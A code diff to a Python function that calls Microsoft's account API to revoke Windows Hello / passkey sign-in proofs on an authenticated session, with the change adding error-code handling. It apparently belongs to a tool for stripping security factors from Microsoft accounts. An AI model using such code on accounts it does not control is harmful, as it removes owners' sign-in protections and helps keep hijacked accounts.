@@ -2,7 +2,7 @@ import logging
 import httpx
 
 async def remove_zyger(session: httpx.AsyncClient, apicanary: str):
-    # Removes loggin through pass keys aka Zyger
+    # Removes login through pass keys aka Zyger / Windows Hello
     
     remove = await session.post(
         url = "https://account.live.com/API/Proofs/RevokeWindowsHelloProofs",
@@ -20,10 +20,25 @@ async def remove_zyger(session: httpx.AsyncClient, apicanary: str):
             "hpgid": 201030
         },
         follow_redirects = False
-    ) 
-    
-    if remove.status_code == 200:
+    )
+
+    body = remove.text or ""
+    err_code = None
+    try:
+        data = remove.json()
+        err = data.get("error") if isinstance(data, dict) else None
+        if isinstance(err, dict):
+            err_code = err.get("code")
+        elif err is not None:
+            err_code = err
+    except Exception:
+        data = None
+
+    # MS often returns HTTP 200 with {"error":{"code":"6001"}} — treat as failure.
+    if remove.status_code == 200 and not err_code:
         print("[+] - Removed Zyger")
-    else:
-        print("[X] - Failed to remove Zyger")
-        logging.error(f"Failed to remove Zyger: {remove.text}")
+        return True
+
+    print(f"[X] - Failed to remove Zyger (status={remove.status_code} err={err_code})")
+    logging.error("Failed to remove Zyger: %s", body[:500])
+    return False
